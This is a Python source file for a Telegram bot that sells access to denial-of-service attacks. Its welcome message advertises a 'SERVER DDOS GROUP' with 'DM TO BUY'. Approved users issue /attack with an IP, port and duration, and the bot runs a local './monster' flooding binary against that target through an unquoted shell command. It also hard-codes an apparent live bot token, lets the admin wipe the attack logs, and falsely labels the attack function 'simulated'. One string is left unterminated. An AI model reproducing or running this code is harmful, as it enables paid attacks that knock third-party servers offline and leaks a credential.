import asyncio
import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7444215342:AAGhpZbH_krg4LS2xmYadZ_oJ_PhaZZCAHQ'
ADMIN_USER_ID = -1002220761952  # Replace with your admin group ID
USERS_FILE = 'users.txt'
LOG_FILE = 'log.txt'
attack_in_progress = False
users = set()
user_approval_expiry = {}


# Load users from the file
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


# Save users to the file
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)


# Ensure admin is always added to users
def ensure_admin_user():
    if str(ADMIN_USER_ID) not in users:
        users.add(str(ADMIN_USER_ID))
        save_users(users)


# Log attack commands
def log_command(user_id, target, port, duration):
    with open(LOG_FILE, 'a') as f:
        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Duration: {duration} | Timestamp: {datetime.datetime.now()}\n")


# Clear logs
def clear_logs():
    try:
        with open(LOG_FILE, 'r+') as f:
            if f.read().strip():
                f.truncate(0)
                return "*✅ Logs cleared successfully.*"
            else:
                return "*⚠️ No logs found.*"
    except FileNotFoundError:
        return "*⚠️ No logs file found.*"


# Set approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    user_approval_expiry[user_id] = expiry_date
    return True


# Get remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        return str(remaining_time) if remaining_time.total_seconds() > 0 else "Expired"
    return "N/A"


# Command: /start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*👹 SERVER DDOS GROUP 👹*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "* DM TO BUY: GROUP ADMIN*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')


# Command: /add
async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) < 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <group_id|chat_id> <duration><time_unit>*\nExample: /add 12345 30days", parse_mode='Markdown')
        return

    id_to_add = args[0]
    duration_str = args[1]

    try:
        duration = int(duration_str[:-4])
        time_unit = duration_str[-4:].lower()
        if set_approval_expiry_date(id_to_add, duration, time_unit):
            users.add(id_to_add)
            save_users(users)
            expiry_date = user_approval_expiry[id_to_add]
            response = f"*✔️ ID {id_to_add} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
        else:
            response = "*⚠️ Invalid time unit. Use 'hours', 'days', 'weeks', or 'months'.*"
    except ValueError:
        response = "*⚠️ Invalid duration format.*"

    await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')


# Command: /viewlogs
async def view_logs(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
        return

    try:
        with open(LOG_FILE, 'r') as f:
            logs = f.read().strip() or "*No logs available.*"
    except FileNotFoundError:
        logs = "*No logs available.*"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*Logs:*\n\n{logs}", parse_mode='Markdown')


# Command: /clearlogs
async def clear_logs_command(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
        return

    response = clear_logs()
    await context.bot.send_message(chat_id=update.effective_chat.id, text=response, parse_mode='Markdown')


# Simulated attack execution
async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        command = f"./monster {ip} {port} {duration} 1000"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ **ATTACK FINISHHO GYA HA KISI OR KO LGANA HA LGA SAKTA HA!***", parse_mode='Markdown')


# Command: /attack
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **ACCESS LALA BROTHER**.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **THODA WAIT KARO FRIEND**.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    try:
        duration = int(duration)
        if duration > 300:
            response = "*⚠️ Error: Duration must be less than or equal to 300 seconds.*"
            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **JYADA SECOND KA MATT LGA** .*", parse_mode='Markdown')
        return

    log_command(user_id, ip, port, duration)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack started!*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"* JOIN 🔗 
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))


# Main function
def main():
    global users
    users = load_users()
    ensure_admin_user()  # Ensure admin user is always added

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("viewlogs", view_logs))
    application.add_handler(CommandHandler("clearlogs", clear_logs_command))
    application.run_polling()


if __name__ == '__main__':
    main()
